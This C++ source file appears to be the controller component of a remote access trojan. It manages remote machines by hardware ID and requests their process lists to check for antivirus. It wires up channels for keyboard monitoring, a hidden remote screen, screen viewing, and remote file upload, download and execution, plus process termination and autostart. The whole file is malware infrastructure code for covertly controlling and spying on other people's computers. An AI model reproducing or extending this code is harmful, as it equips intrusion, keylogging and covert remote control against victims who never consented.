#include "Controller.h"
#include "AApch.h"
#include "AbstractProtocol.h"
#include "FileChannel.h"
#include "HeartbeatChannel.h"
#include "ProgramChannel.h"
#include "ScreenChannel.h"


Network::Controller::Controller(AbstractSession *session)
    : AbstractMultiChannel(session, nullptr) {
  // Forward signals
  connect(&session->notifier, &IPacketNotify::recvGetProcess, this,
          &Controller::recvGetProcess);
  connect(&session->notifier, &IPacketNotify::recvInformation, this,
          &Controller::recvInformation);
  connect(&session->notifier, &IPacketNotify::recvQueryProgram, this,
          &Controller::recvQueryProgram);
  connect(&session->notifier, &IPacketNotify::recvReinitialize, this,
          &Controller::recvReinitialize);
  connect(&session->notifier, &IPacketNotify::recvTaskAutoStart, this,
          &Controller::recvTaskAutoStart);
  connect(&session->notifier, &IPacketNotify::recvTerminateProcess, this,
          &Controller::recvTerminateProcess);
  connect(&session->notifier, &IPacketNotify::lag, this, &Controller::lag);

  // Connect our private slots
  connect(&session->notifier, &IPacketNotify::recvInformation, this,
          &Controller::onInformation);

  // Listen channel connection
  connect(this, &AbstractMultiChannel::channelConnected, this,
          &Controller::onChannelConnected);

  // Add initialize code here
  requestInformation();
}

Network::Controller::~Controller() { information.reset(); }

std::string Network::Controller::getRemoteAddress() const {
  return session->getRemoteAddress();
}

std::string Network::Controller::getHwid() const { return session->getHwid(); }

bool Network::Controller::requestInformation() {
  return session->sendJsonPacket(
      Packet::Generator<Packet::RequestInformation>());
}

bool Network::Controller::requestProgram() {
  return session->sendJsonPacket(
      Packet::Generator<Packet::RequestQueryProgram>());
}

void Network::Controller::onInformation(
    std::shared_ptr<Packet::Header> header,
    std::shared_ptr<Packet::ResponseInformation> packet) {
  spdlog::debug("information set");
  information = packet;

  // Request process, preparing to query av
  session->sendJsonPacket(Packet::Generator<Packet::RequestGetProcess>());
  // Request starting heartbeat
  requestOpenChannel(Packet::Handshake::Role::heartbeat);
}

void Network::Controller::onChannelConnected(Packet::Handshake::Role role,
                                             AbstractChannel *sub_channel) {
  if (role == Packet::Handshake::Role::file) {
    auto pointer = (FileChannel *)sub_channel;
    connect(pointer, &FileChannel::recvDeleteFile, this,
            &Controller::recvDeleteFile);
    connect(pointer, &FileChannel::recvDownloadFile, this,
            &Controller::recvDownloadFile);
    connect(pointer, &FileChannel::recvExecuteFile, this,
            &Controller::recvExecuteFile);
    connect(pointer, &FileChannel::recvQueryFile, this,
            &Controller::recvQueryFile);
    connect(pointer, &FileChannel::recvUploadFile, this,
            &Controller::recvUploadFile);
  } else if (role == Packet::Handshake::Role::keyboard_monitor) {
  } else if (role == Packet::Handshake::Role::remote_hidden_screen) {
  } else if (role == Packet::Handshake::Role::remote_screen) {
    auto pointer = (ScreenChannel *)sub_channel;
    connect(pointer, &ScreenChannel::recvRemoteScreen, this,
            &Controller::recvRemoteScreen);
  } else if (role == Packet::Handshake::Role::heartbeat) {
    auto pointer = (HeartbeatChannel *)sub_channel;
    connect(pointer, &HeartbeatChannel::recvHeartbeat, this,
            &Controller::recvHeartbeat);
  } else if (role == Packet::Handshake::Role::program) {
    auto pointer = (ProgramChannel *)sub_channel;
    connect(pointer, &ProgramChannel::recvQueryProgram, this,
            &Controller::recvQueryProgram);
  } else {
    spdlog::error("bug detected, unhandled subchannel");
    assert(false);
  }

  connect(sub_channel, &AbstractChannel::lag, this, &Controller::lag);
}